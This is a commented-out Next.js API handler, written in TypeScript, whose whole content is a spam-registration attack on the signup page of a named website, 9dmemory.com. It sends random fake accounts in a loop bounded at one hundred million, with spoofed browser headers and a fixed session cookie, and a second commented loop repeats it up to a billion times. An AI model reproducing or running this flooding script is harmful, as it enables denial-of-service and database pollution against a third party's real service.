// import crypto from 'crypto';
// import type { NextApiRequest, NextApiResponse } from 'next';
//
// function generateRandomString(length: number): string {
//   const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
//   let randomString = '';
//
//   // eslint-disable-next-line no-plusplus
//   for (let i = 0; i < length; i++) {
//     const randomIndex = crypto.randomInt(0, characters.length);
//     randomString += characters[randomIndex];
//   }
//
//   return randomString;
// }
//
// export default async function handler(req: NextApiRequest, res: NextApiResponse) {
//   const myHeaders = new Headers();
//   myHeaders.append(
//     'Accept',
//     'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
//   );
//   myHeaders.append('Accept-Language', 'vi-VN,vi;q=0.9');
//   myHeaders.append('Cache-Control', 'max-age=0');
//   myHeaders.append('Connection', 'keep-alive');
//   myHeaders.append('Content-Type', 'application/x-www-form-urlencoded');
//   myHeaders.append('Cookie', 'ASP.NET_SessionId=uzkvmrqn2gldwtsgkbjhkuv5');
//   myHeaders.append('Origin', 'http://9dmemory.com/');
//   myHeaders.append('Referer', 'http://9dmemory.com/Signup.html');
//   myHeaders.append('Upgrade-Insecure-Requests', '1');
//   myHeaders.append(
//     'User-Agent',
//     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
//   );
//
//   function sleep(ms: number): Promise<void> {
//     return new Promise((resolve) => {
//       setTimeout(resolve, ms);
//     });
//   }
//
//   // Sử dụng vòng lặp để tạo 10000 người dùng
//   for (let i = 1; i <= 100000000; i++) {
//     const rdStr = generateRandomString(20);
//     const urlencoded = new URLSearchParams();
//     const username = `${rdStr}${i}`;
//     const email = `${rdStr}${i}@gmail.com`;
//     const password = `${rdStr}${i}`;
//     const passwordx = `${rdStr}${i}`;
//     const telephone = `${rdStr}${i}`;
//     const name = `${rdStr}${i}`;
//     urlencoded.append('username', username);
//     urlencoded.append('password', password);
//     urlencoded.append('passwordx', passwordx);
//     urlencoded.append('email', email);
//     urlencoded.append('telephone', telephone);
//     urlencoded.append('last-name', name);
//
//     const requestOptions = {
//       method: 'POST',
//       headers: myHeaders,
//       body: urlencoded,
//       redirect: 'follow'
//     };
//     fetch('http://9dmemory.com/Signup.html', requestOptions)
//       .then((response) => {
//         return response.text();
//       })
//       .then((result) => {
//         return console.log(result);
//       });
//     // eslint-disable-next-line no-await-in-loop
//     await sleep(50);
//   }
//
//   // for (let i = 1; i <= 1000000000; i++) {
//   //   const rdStr = generateRandomString(30);
//   //   const urlencoded = new URLSearchParams();
//   //   const username = `${rdStr}${i}`;
//   //   const email = `${rdStr}${i}@gmail.com`;
//   //   const password = `${rdStr}${i}`;
//   //   const passwordx = `${rdStr}${i}`;
//   //   const telephone = `${rdStr}${i}`;
//   //   const name = `${rdStr}${i}`;
//   //   urlencoded.append('username', username);
//   //   urlencoded.append('password', password);
//   //   urlencoded.append('passwordx', passwordx);
//   //   urlencoded.append('email', email);
//   //   urlencoded.append('telephone', telephone);
//   //   urlencoded.append('last-name', name);
//   //
//   //   const requestOptions = {
//   //     method: 'POST',
//   //     headers: myHeaders,
//   //     body: urlencoded,
//   //     redirect: 'follow'
//   //   };
//   //   fetch('http://9dmemory.com/Signup.html', requestOptions)
//   //     .then((response) => {
//   //       return response.text();
//   //     })
//   //     .then((result) => {
//   //       return console.log(result);
//   //     });
//   //   // eslint-disable-next-line no-await-in-loop
//   //   await sleep(80);
//   // }
// }
